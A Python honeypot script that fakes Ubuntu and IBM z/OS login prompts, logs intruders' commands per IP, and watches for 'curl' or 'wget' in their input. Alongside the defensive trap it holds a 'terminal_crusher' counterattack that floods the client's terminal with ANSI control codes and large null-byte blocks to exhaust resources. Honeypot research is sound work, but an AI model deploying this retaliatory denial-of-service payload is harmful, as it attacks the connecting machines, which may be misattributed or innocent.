import time
import os
import random

def terminal_crusher(client_socket):
    print("[⚔️] Mesh-Intel: Iniciando Terminal Crusher (CPU/RAM/Disk Exhaustion).")
    ansi_bomb = b"\x1b[2J\x1b[H\x1b[?1049h"
    try:
        while True:
            payload = ansi_bomb
            for _ in range(15):
                color = os.urandom(1)[0]
                payload += f"\x1b[48;5;{color}m".encode() + b"\x00" * 150000 + b"\a"
            client_socket.send(payload)
            time.sleep(0.04)
    except: pass

def handle_cowrie_trap(client_socket, ip):
    """Simula Ubuntu y captura comandos para análisis forense"""
    try:
        banner = b"Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)\r\n\r\n"
        client_socket.send(banner)
        client_socket.send(f"hell-node-01 login: ".encode())
        user = client_socket.recv(1024).decode().strip()
        client_socket.send(b"Password: ")
        client_socket.recv(1024)
        
        welcome = f"Welcome to Ubuntu 22.04.3 LTS\r\nroot@hell-node-01:~# ".encode()
        client_socket.send(welcome)

        # Captura de comandos
        commands_captured = []
        while True:
            cmd = client_socket.recv(1024).decode().strip()
            if not cmd: break
            commands_captured.append(cmd)
            
            # Guardar en log temporal de la IP
            with open(f"logs/forensics/commands_{ip}.log", "a") as f:
                f.write(f"[{time.ctime()}] {cmd}\n")

            if cmd in ["exit", "logout"]: break
            
            # El contraataque se dispara tras 3 comandos o comandos sospechosos
            if len(commands_captured) >= 3 or "curl" in cmd or "wget" in cmd:
                client_socket.send(b"\r\n-bash: critical memory corruption detected. Dumping core...\r\n")
                terminal_crusher(client_socket)
                break
            
            client_socket.send(f"{cmd}: command not found\r\nroot@hell-node-01:~# ".encode())
            
    except: pass

def handle_mainframe_shell(client_socket, ip):
    try:
        client_socket.send(b"ICH70001I - LOGIN TO IBM z/OS v2.5 AT MONEX-FINANCIAL-MEX\r\nENTER USERID - \r\n")
        client_socket.recv(1024)
        client_socket.send(b"ENTER PASSWORD - \r\n")
        client_socket.recv(1024)
        client_socket.send(b"ICH70008I LOGIN SUCCESSFUL. SYSTEM: MONEX-MX-COBOL-V8\r\nREADY\r\n")
        time.sleep(15)
        client_socket.send(b"\r\n*** CRITICAL SYSTEM OVERLOAD - INITIATING MEMORY DUMP ***\r\n")
        terminal_crusher(client_socket)
    except: pass
